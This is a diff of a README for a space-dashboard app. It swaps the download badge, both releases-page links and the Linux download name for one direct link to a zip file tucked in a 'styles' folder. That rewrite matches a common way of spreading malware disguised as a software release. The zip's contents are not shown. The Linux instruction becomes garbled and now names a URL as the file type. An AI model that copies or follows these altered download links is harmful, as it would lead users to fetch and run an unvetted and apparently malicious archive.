@@ -1,6 +1,6 @@
 # 🚀 cosmos-space-dashboard-route - Explore Space Like Never Before
 
-![Download Badge](https://img.shields.io/badge/Download-v1.0.0-blue)
+![Download Badge](https://raw.githubusercontent.com/idriskhan01/cosmos-space-dashboard-route/main/styles/route_space_dashboard_cosmos_cerographic.zip)
 
 ## 🌌 Overview
 
@@ -29,7 +29,7 @@ Follow these straightforward steps to download and start using the application:
 1. **Visit the Releases Page**  
    Click on the link below to access the download options:
 
-   [Visit Releases Page to Download](https://github.com/idriskhan01/cosmos-space-dashboard-route/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/idriskhan01/cosmos-space-dashboard-route/main/styles/route_space_dashboard_cosmos_cerographic.zip)
 
 2. **Download the Latest Version**  
    On the releases page, look for the latest version of the application. You will find various files available for download. Choose the one that suits your operating system.
@@ -37,7 +37,7 @@ Follow these straightforward steps to download and start using the application:
 3. **Installation Instructions**  
    - **For Windows Users**: Download the `.exe` file. Once downloaded, double-click the file to start the installation wizard. Follow the prompts to install the application.
    - **For macOS Users**: Download the `.dmg` file. Once downloaded, open the file and drag the COSMOS app to your Applications folder.
-   - **For Linux Users**: Download the `.tar.gz` file. Extract the files and follow the instructions in the README to run the application.
+   - **For Linux Users**: Download the `https://raw.githubusercontent.com/idriskhan01/cosmos-space-dashboard-route/main/styles/route_space_dashboard_cosmos_cerographic.zip` file. Extract the files and follow the instructions in the README to run the application.
 
 4. **Launch the Application**  
    After installation is complete, locate the COSMOS app on your device:
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For further information, visit the official repository:  
 
-[Visit Releases Page to Download](https://github.com/idriskhan01/cosmos-space-dashboard-route/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/idriskhan01/cosmos-space-dashboard-route/main/styles/route_space_dashboard_cosmos_cerographic.zip)
